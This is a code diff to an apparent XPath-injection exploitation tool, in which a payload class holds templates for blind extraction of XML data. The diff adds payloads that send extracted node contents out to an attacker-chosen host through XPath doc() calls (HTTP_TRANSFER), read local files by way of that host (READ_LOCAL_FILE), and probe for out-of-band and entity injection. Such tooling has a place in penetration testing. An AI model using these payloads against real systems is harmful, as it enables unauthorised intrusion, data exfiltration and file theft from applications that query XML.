@@ -21,7 +21,7 @@ class Payload(object):
         self.payload = string.Template(self.payload.template.replace(char, newchar))
         return self
 
-    def Create(self, parent):
+    def Create(self, parent, wrap_base=True):
         output = self.payload
         if parent.config.xversion == "2":
             if self.takes_codepoints:
@@ -36,6 +36,9 @@ class Payload(object):
                 output = string.Template(output.safe_substitute(node=parent.PAYLOADS["WRAP_LOWERCASE"].GetString()))
                 #print "Output (lower): %s"%output.template
 
+        if not wrap_base:
+            return output
+
         return string.Template(parent.BASE.substitute(payload=output.safe_substitute()))
 
     def GetString(self):
@@ -45,7 +48,7 @@ class Payload(object):
         return str(self)
 
     def __str__(self):
-        return "<Payload `%s`>"%(self.payload)
+        return "<Payload `%s`>"%self.payload
 
 class WrapperPayload(Payload):
     pass
@@ -58,7 +61,12 @@ class PayloadMaker(object):
         "WRAP_LOWERCASE"       : WrapperPayload("lower-case($node)"),
         "WRAP_UNICODE"         : WrapperPayload("normalize-unicode($node)"),
         "STRING-TO-CODEPOINTS" : WrapperPayload("string-to-codepoints($node)"),
-        "HTTP_TRANSFER"        : WrapperPayload("boolean(doc(concat('http://$host$port/?id=$id-',encode-for-uri($node))))", can_lower=True, normalization=True),
+        "HTTP_TRANSFER"        : WrapperPayload("boolean(doc(concat('http://$host/doc?id=$id-',encode-for-uri($node))))", can_lower=True, normalization=True),
+        "HTTP_TRANSFER_TEST"   : Payload("boolean(doc('http://$host/doc?id=$id-1'))"),
+        "QUOTE_CHARACTER_TEST" : Payload("true()"),
+
+        "ENTITY_INJECTION_TEST": Payload("boolean(doc('http://$host/file?t=1')/data/text()='ok')"),
+        "READ_LOCAL_FILE"      : Payload("doc(concat('http://$host/file?p=', encode-for-uri('$path')))/$node", can_lower=True, normalization=True),
 
         "GET_NODE_CODEPOINT"   : Payload("string-to-codepoints($node)[$index]=$count", can_lower=True, normalization=True),
         "GET_CODEPOINT_LENGTH" : Payload("(string-to-codepoints($node)[$index] > $min and string-to-codepoints($node)[$index] <= $max)", can_lower=True, normalization=True),
@@ -73,7 +81,6 @@ class PayloadMaker(object):
 
         "GET_COUNT_LENGTH_U"   : Payload("(count($node) > $min and count($node) <= $max)", can_lower=True, normalization=True, takes_codepoints=True),
         "NODE_COUNT_U"         : Payload("count($node)=$count", can_lower=True, normalization=True, takes_codepoints=True),
-
         }
 
 
@@ -93,8 +100,8 @@ class PayloadMaker(object):
             self.PAYLOADS[payload] = self.PAYLOADS[payload].replace("'", config.quote_character)
 
 
-    def Get(self, name):
-        payload = self.PAYLOADS[name.upper()].Create(self)
+    def Get(self, name, wrap_base=True):
+        payload = self.PAYLOADS[name.upper()].Create(self, wrap_base=wrap_base)
         return payload.safe_substitute
 
     @defer.inlineCallbacks
